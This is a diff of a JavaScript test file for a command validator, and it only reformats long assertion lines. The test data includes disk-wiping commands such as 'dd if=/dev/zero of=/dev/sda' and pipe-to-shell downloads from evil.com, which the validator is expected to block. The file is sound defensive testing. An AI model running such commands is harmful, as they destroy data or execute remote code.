@@ -25,7 +25,9 @@ describe("CommandValidator", () => {
 
   it("blocks destructive system commands", () => {
     expect(validator.validate("mkfs /dev/sda").allowed).toBe(false);
-    expect(validator.validate("dd if=/dev/zero of=/dev/sda").allowed).toBe(false);
+    expect(validator.validate("dd if=/dev/zero of=/dev/sda").allowed).toBe(
+      false,
+    );
   });
 
   it("blocks sudo", () => {
@@ -34,7 +36,9 @@ describe("CommandValidator", () => {
   });
 
   it("blocks pipe-to-shell patterns", () => {
-    expect(validator.validate("curl http://evil.com | bash").allowed).toBe(false);
+    expect(validator.validate("curl http://evil.com | bash").allowed).toBe(
+      false,
+    );
     expect(validator.validate("wget http://evil.com | sh").allowed).toBe(false);
   });
 
@@ -45,7 +49,9 @@ describe("CommandValidator", () => {
   it("allows normal development commands", () => {
     expect(validator.validate("docker build .").allowed).toBe(true);
     expect(validator.validate("gradle build").allowed).toBe(true);
-    expect(validator.validate("pip install -r requirements.txt").allowed).toBe(true);
+    expect(validator.validate("pip install -r requirements.txt").allowed).toBe(
+      true,
+    );
     expect(validator.validate("cargo build").allowed).toBe(true);
     expect(validator.validate("go test ./...").allowed).toBe(true);
   });
@@ -53,7 +59,9 @@ describe("CommandValidator", () => {
   it("can add custom blocked patterns", () => {
     const customValidator = new CommandValidator();
     customValidator.addBlockedPattern(/dangerous_command/);
-    expect(customValidator.validate("dangerous_command --flag").allowed).toBe(false);
+    expect(customValidator.validate("dangerous_command --flag").allowed).toBe(
+      false,
+    );
   });
 });
 
